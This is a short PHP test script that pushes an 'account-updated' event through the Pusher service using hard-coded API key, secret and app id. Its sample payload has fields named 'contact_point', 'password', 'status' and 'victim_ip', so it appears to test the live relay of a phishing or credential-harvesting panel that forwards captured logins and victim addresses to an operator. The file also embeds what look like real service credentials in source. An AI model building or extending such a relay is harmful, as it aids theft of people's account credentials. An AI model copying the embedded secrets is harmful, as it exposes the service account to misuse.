<?php
session_start();

require __DIR__ . '/vendor/autoload.php';

// Pusher credentials
$pusher = new Pusher\Pusher(
    '93b775996895ce581f7b', // key
    'fe61b1799f1a422e991c', // secret
    '2065178',               // app_id
    [
        'cluster' => 'ap1',
        'useTLS' => true
    ]
);

// Lấy session_id hiện tại
$session_id = $_SESSION['session_id'] ?? 'no-session';

// Tạo test data
$test_data = [
    'contact_point' => 'test@example.com',
    'password' => 'test123',
    'status' => 'approved',
    'victim_ip' => '192.168.1.1',
    'timestamp' => date('Y-m-d H:i:s'),
    'message' => 'This is a test trigger!'
];

try {
    // Trigger event
    $pusher->trigger(
        'session-' . $session_id,  // Channel
        'account-updated',          // Event name
        $test_data                  // Data
    );
    
    echo json_encode([
        'success' => true,
        'message' => 'Event triggered successfully!',
        'channel' => 'session-' . $session_id,
        'data' => $test_data
    ]);
} catch (Exception $e) {
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'error' => $e->getMessage()
    ]);
}
?>

